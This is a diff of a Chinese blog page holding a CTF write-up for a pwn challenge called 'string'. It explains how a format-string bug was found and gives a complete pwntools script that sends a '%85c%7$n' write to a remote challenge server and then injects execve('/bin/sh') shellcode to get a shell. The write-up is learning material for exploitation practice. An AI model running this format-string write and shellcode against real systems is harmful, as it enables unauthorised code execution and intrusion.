@@ -17,19 +17,21 @@
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <title>post - 王某杂谈</title>
+  <title>AD_string - 王某杂谈</title>
 
   
     <meta name="description" content="AD string WP这个题戏好多啊 总而言之，终于摸到了格式化字符串漏洞的大门！ 具体步骤 checksec发现地址是动态的，die查壳发现是64位  运行一下全是字，然后发现诶，有secret,看来是好东西（当时应该想到是地址的）。  打开发现居然有secret地址输出诶！（当时应该想到是格式化字符串的）   4.然后读流程，基本上就是文字游戏，注意两点：   游戏中间有个printf非常奇">
 <meta property="og:type" content="article">
-<meta property="og:title" content="王某杂谈">
-<meta property="og:url" content="http://example.com/2021/04/29/2021-01-17-Pwn%20string/index.html">
+<meta property="og:title" content="AD_string">
+<meta property="og:url" content="http://example.com/2021/01/17/AD-string/index.html">
 <meta property="og:site_name" content="王某杂谈">
 <meta property="og:description" content="AD string WP这个题戏好多啊 总而言之，终于摸到了格式化字符串漏洞的大门！ 具体步骤 checksec发现地址是动态的，die查壳发现是64位  运行一下全是字，然后发现诶，有secret,看来是好东西（当时应该想到是地址的）。  打开发现居然有secret地址输出诶！（当时应该想到是格式化字符串的）   4.然后读流程，基本上就是文字游戏，注意两点：   游戏中间有个printf非常奇">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-04-29T12:10:48.094Z">
-<meta property="article:modified_time" content="2021-01-23T09:34:19.014Z">
+<meta property="article:published_time" content="2021-01-17T11:59:23.000Z">
+<meta property="article:modified_time" content="2021-05-10T12:00:02.597Z">
 <meta property="article:author" content="Zuni">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="AD">
 <meta name="twitter:card" content="summary">
   
   
@@ -96,14 +98,14 @@
       
     </div>
     <div id='post-meta'>
-      发布于&nbsp;<time datetime='2021-04-29T12:10:48.094Z'>2021-04-29</time>
+      发布于&nbsp;<time datetime='2021-01-17T11:59:23.000Z'>2021-01-17</time>
     </div>
   
   </div>
 
 
 <article class='content md post'>
-
+<h1 class="article-title"><span>AD_string</span></h1>
 <h1 id="AD-string-WP"><a href="#AD-string-WP" class="headerlink" title="AD string WP"></a>AD string WP</h1><p><del>这个题戏好多啊</del></p>
 <p>总而言之，终于摸到了格式化字符串漏洞的大门！</p>
 <h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><ol>
@@ -120,13 +122,13 @@
 <li>游戏中间有个printf非常奇怪： <code>printf(&amp;format,&amp;format)</code>    注意到format本身就是格式化的意思，且还是wish（好冷），应该判断这个地方就是输入格式化字符串改变某些值</li>
 </ol>
 </li>
-<li> 最后有一个直接将字符串运行，可以注入shellcode（不是sheetcode！），但是条件是使某两个数相等</li>
+<li><p>最后有一个直接将字符串运行，可以注入shellcode（不是sheetcode！），但是条件是使某两个数相等</p>
+</li>
 </ol>
 <p>5.综上可知应该是通过改变这两个secret中的一个的值，然后注入sheetcode，具体脚本如下。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;remote(&quot;220.249.52.134&quot;,57100)</span><br><span class="line">payload&#x3D;&quot;%85c%7$n&quot;</span><br><span class="line">p.recvuntil(&quot;secret[0] is &quot;)</span><br><span class="line">addr&#x3D;int(p.recvuntil(&quot;\n&quot;),16)</span><br><span class="line">p.recvuntil(&quot;be:&quot;)</span><br><span class="line">p.sendline(&quot;aaa&quot;)</span><br><span class="line">p.recvuntil(&quot;up?:&quot;)</span><br><span class="line">p.sendline(&quot;east&quot;)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;address&quot;)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(&quot;is:&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;SPELL&quot;)</span><br><span class="line">shellcode &#x3D; &#39;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#39;</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="关于格式化字符串"><a href="#关于格式化字符串" class="headerlink" title="关于格式化字符串"></a>关于格式化字符串</h3><p>在学，争取下周出个wiki</p>
-<p>Enter text in <a target="_blank" rel="noopener" href="http://daringfireball.net/projects/markdown/">Markdown</a>. Use the toolbar above, or click the <strong>?</strong> button for formatting help.</p>
 
 
 <div class="article-footer fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
@@ -134,7 +136,7 @@
 
 </article>
 
-<div class="related-wrap" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body"><div class="post-title h2"><a href="/2021/04/29/2021-01-15-Pwn-int_overflow/">undefined</a></div><div class="post-title fs14"><a href="/2021/04/29/2021-01-17-Pwn-cg%20pwn2/">上一篇：undefined</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body"><div class="post-title h2"><a href="/2021/01/17/int-overflow/">int_overflow</a></div><div class="post-title fs14"><a href="/2021/01/17/AD-cg-pwn2/">上一篇：AD_cg_pwn2</a></div></section></div>
 
 
 
